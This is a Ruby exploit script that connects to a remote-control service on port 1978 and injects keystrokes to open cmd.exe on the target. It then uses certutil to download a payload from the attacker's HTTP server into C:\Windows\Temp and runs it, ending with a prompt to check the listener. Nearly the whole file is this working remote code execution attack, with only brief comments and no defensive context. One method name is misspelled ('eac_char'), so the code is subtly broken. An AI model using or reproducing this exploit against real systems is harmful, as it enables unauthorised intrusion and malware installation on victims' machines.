require 'socket'; #This line imports the socket library, which provides classes and methods for creating and interacting with network sockets.

def open_cmd(socket)    
    socket.puts('openfile /C/Windows/System32/cmd.exe\n');
end#This defines a method open_cmd that takes a socket object as an argument. Inside the method, it sends the command to open the command prompt (cmd.exe) on the target system using socket.puts.

def send_string(socket,string)
string.eac_char do |char|
    hex_value=char.ord.to_s(16)
    socket.puts("utf8 #{hex_value} 0a\n")
    sleep(0.03)
  
end
end
def send_return(socket)
    socket.puts("key 3RTN\n")
    sleep(0.5)
end
def exploit(socket,lhost,payload)
    puts("[+] 3..2..1..")
    sleep(2)
    open_cmd(socket)
    puts("[+] *Super fast hacker typing*")
    sleep(1)
    send_string(socket, "certutil.exe -urlcache -f http://#{lhost}/#{payload} C:\\Windows\\Temp\\#{payload}");
    send_return(socket)
  puts("[+] Retrieving payload")
  sleep(3)
  send_string(socket, "C:\\Windows\\Temp\\#{payload}")
  send_return(socket)
  puts("[+] Done! Check Your Listener?")
end
def main
    if ARGV.length < 3
      puts "USAGE: ruby #{__FILE__} <target-ip> <local-http-server-ip> <payload-name>"
      exit(1)
    end
  
    target_ip = ARGV[0]
    local_http_server_ip = ARGV[1]
    payload_name = ARGV[2]
  
    port = 1978
  
    begin
      socket = TCPSocket.new(target_ip, port)
      exploit(socket, local_http_server_ip, payload_name)
    rescue => e
      puts "An error occurred: #{e.message}"
    ensure
      socket.close if socket
    end
  end
  if __FILE__ == $0
    main
  end
    



